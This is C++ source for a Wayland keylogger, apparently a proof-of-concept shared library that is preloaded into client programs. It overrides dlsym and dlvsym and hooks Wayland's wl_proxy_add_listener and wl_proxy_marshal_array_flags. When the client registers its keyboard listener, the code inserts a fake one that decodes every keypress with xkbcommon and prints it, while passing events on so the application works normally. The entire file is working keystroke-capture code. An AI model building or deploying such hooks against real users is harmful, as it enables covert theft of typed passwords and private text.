#include "elfhacks.h"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <wayland-client.h>
#include <xkbcommon/xkbcommon.h>

int my_wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data);
struct wl_proxy* my_wl_proxy_marshal_array_flags(struct wl_proxy *proxy, uint32_t opcode,
			     const struct wl_interface *interface,
			     uint32_t version,
			     uint32_t flags,
			     union wl_argument *args);

void *(*g_real_dlsym)(void*, const char*) = NULL;
void *(*g_real_dlvsym)(void*, const char*, const char*) = NULL;
struct wl_proxy* (*g_real_wl_proxy_marshal_array_flags)(struct wl_proxy *proxy, uint32_t opcode,
			     const struct wl_interface *interface,
			     uint32_t version,
			     uint32_t flags,
			     union wl_argument *args);

int (*g_real_wl_proxy_add_listener)(struct wl_proxy*, void (**)(void), void*);

int g_hooks_initialized = 0;
int g_listener_initialized = 0;
int g_xkb_initialized = 0;

void init_hooks() {
	
	if(g_hooks_initialized)
		return;
	
	// part 1: get dlsym and dlvsym
	eh_obj_t libdl;
	if(eh_find_obj(&libdl, "*libc.so*")) {
		fprintf(stderr, "[wayland-keylogger] Can't open libdl.so!\n");
		exit(-181818181);
	}
	if(eh_find_sym(&libdl, "dlsym", (void **) &g_real_dlsym)) {
		fprintf(stderr, "[wayland-keylogger] Can't get dlsym address!\n");
		eh_destroy_obj(&libdl);
		exit(-181818181);
	}
	if(eh_find_sym(&libdl, "dlvsym", (void **) &g_real_dlvsym)) {
		fprintf(stderr, "[wayland-keylogger] Can't get dlvsym address!\n");
		eh_destroy_obj(&libdl);
		exit(-181818181);
	}
	eh_destroy_obj(&libdl);
	
	// part 2: get everything else
	g_real_wl_proxy_add_listener = (int (*)(struct wl_proxy*, void (**)(void), void*))
		g_real_dlsym(RTLD_NEXT, "wl_proxy_add_listener");
	g_real_wl_proxy_marshal_array_flags = (struct wl_proxy* (*)(struct wl_proxy *proxy, uint32_t opcode,
			     const struct wl_interface *interface,
			     uint32_t version,
			     uint32_t flags,
			     union wl_argument *args))
		g_real_dlsym(RTLD_NEXT, "wl_proxy_marshal_array_flags");

	
	fprintf(stderr, "[wayland-keylogger] init_hooks end.\n");
	
	g_hooks_initialized = 1;
	
}

struct Hook {
	const char* name;
	void* address;
};

Hook hook_table[] = {
	{"wl_proxy_add_listener", (void*) &my_wl_proxy_add_listener},
	{"wl_proxy_marshal_array_flags", (void*) &my_wl_proxy_marshal_array_flags},
};

struct KeyLoggerData {
	void (**implementation)(void);
	void *data;
};

void MyHandleKeyboardKeymap(void* data, wl_keyboard* keyboard, uint32_t format, int fd, uint32_t size) {
	KeyLoggerData *d = (KeyLoggerData*) data;
	((wl_keyboard_listener*) d->implementation)->keymap(d->data, keyboard, format, fd, size);
}
void MyHandleKeyboardEnter(void* data, wl_keyboard* keyboard, uint32_t serial, wl_surface* surface, wl_array* keys) {
	KeyLoggerData *d = (KeyLoggerData*) data;
	((wl_keyboard_listener*) d->implementation)->enter(d->data, keyboard, serial, surface, keys);
}
void MyHandleKeyboardLeave(void* data, wl_keyboard* keyboard, uint32_t serial, wl_surface* surface) {
	KeyLoggerData *d = (KeyLoggerData*) data;
	((wl_keyboard_listener*) d->implementation)->leave(d->data, keyboard, serial, surface);
}

struct xkb_context *context = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
struct xkb_keymap *keymap;
struct xkb_state *_xkb_state;
struct xkb_rule_names names = {};

void init_xkb(){
	context = xkb_context_new(XKB_CONTEXT_NO_FLAGS);
	if (context){
		keymap = xkb_keymap_new_from_names(context, &names,
									XKB_KEYMAP_COMPILE_NO_FLAGS);
		_xkb_state = xkb_state_new(keymap);
	} else {
		g_xkb_initialized = -1;
		return;
	}

	keymap ? g_xkb_initialized = 1 : g_xkb_initialized = -1;
	if (!g_hooks_initialized)
		fprintf(stderr, "Failed to init xkb\n");
}

void MyHandleKeyboardKey(void* data, wl_keyboard* keyboard, uint32_t serial, uint32_t time, uint32_t key, uint32_t state) {
	if (!g_xkb_initialized)
		init_xkb();

	if (keymap){
		xkb_keysym_t keysym = xkb_state_key_get_one_sym (_xkb_state, key+8);
		if (keysym == XKB_KEY_F1)
			printf("Pressed F1\n");

		char buf[128];
		xkb_keysym_get_name(keysym, buf, 128);
		printf("UTF-8 input: %s\n", buf);
	}

	KeyLoggerData *d = (KeyLoggerData*) data;
	((wl_keyboard_listener*) d->implementation)->key(d->data, keyboard, serial, time, key, state);
}
void MyHandleKeyboardModifiers(void* data, wl_keyboard* keyboard, uint32_t serial, uint32_t mods_depressed, uint32_t mods_latched, uint32_t mods_locked, uint32_t group) {
	KeyLoggerData *d = (KeyLoggerData*) data;
	((wl_keyboard_listener*) d->implementation)->modifiers(d->data, keyboard, serial, mods_depressed, mods_latched, mods_locked, group);
}
void MyHandleKeyboardRepeatInfo(void* data, wl_keyboard* keyboard, int32_t rate, int32_t delay) {
	KeyLoggerData *d = (KeyLoggerData*) data;
	((wl_keyboard_listener*) d->implementation)->repeat_info(d->data, keyboard, rate, delay);
}

wl_keyboard_listener my_keyboard_listener = {
	MyHandleKeyboardKeymap,
	MyHandleKeyboardEnter,
	MyHandleKeyboardLeave,
	MyHandleKeyboardKey,
	MyHandleKeyboardModifiers,
	MyHandleKeyboardRepeatInfo,
};

struct wl_proxy* g_keyboard_to_log = NULL;

struct wl_proxy *
my_wl_proxy_marshal_array_flags(struct wl_proxy *proxy, uint32_t opcode,
			     const struct wl_interface *interface,
			     uint32_t version,
			     uint32_t flags,
			     union wl_argument *args)
{
	struct wl_proxy* id = proxy;
	if(interface == &wl_keyboard_interface) {
		fprintf(stderr, "[wayland-keylogger] Got keyboard id!\n");
		g_keyboard_to_log = id;
	}
	return g_real_wl_proxy_marshal_array_flags(proxy, opcode, interface, version, flags, args);
}

int my_wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data) {
	if(g_keyboard_to_log != NULL && !g_listener_initialized) {
		fprintf(stderr, "[wayland-keylogger] Adding fake listener!\n");
		g_keyboard_to_log = factory;
		KeyLoggerData *d = new KeyLoggerData(); // memory leak, I know :)
		d->implementation = implementation;
		d->data = data;
		g_listener_initialized = 1;
		return g_real_wl_proxy_add_listener(factory, (void (**)(void)) &my_keyboard_listener, d);
	} else {
		return g_real_wl_proxy_add_listener(factory, implementation, data);
	}
}

// override existing functions
extern "C" int wl_proxy_add_listener(struct wl_proxy *factory, void (**implementation)(void), void *data) {
	init_hooks();
	return my_wl_proxy_add_listener(factory, implementation, data);
}

extern "C" struct wl_proxy *
wl_proxy_marshal_array_flags(struct wl_proxy *proxy, uint32_t opcode,
			     const struct wl_interface *interface,
			     uint32_t version,
			     uint32_t flags,
			     union wl_argument *args)
{
	init_hooks();
	return my_wl_proxy_marshal_array_flags(proxy, opcode, interface, version, flags, args);
}

extern "C" void* dlsym(void* handle, const char* symbol) {
	init_hooks();
	for(unsigned int i = 0; i < sizeof(hook_table) / sizeof(Hook); ++i) {
		if(strcmp(hook_table[i].name, symbol) == 0) {
			fprintf(stderr, "[wayland-keylogger] Hooked: dlsym(%s).\n", symbol);
			return hook_table[i].address;
		}
	}
	return g_real_dlsym(handle, symbol);
}

extern "C" void* dlvsym(void* handle, const char* symbol, const char* version) {
	init_hooks();
	for(unsigned int i = 0; i < sizeof(hook_table) / sizeof(Hook); ++i) {
		if(strcmp(hook_table[i].name, symbol) == 0) {
			fprintf(stderr, "[wayland-keylogger] Hooked: dlvsym(%s,%s).\n", symbol, version);
			return hook_table[i].address;
		}
	}
	return g_real_dlvsym(handle, symbol, version);
}
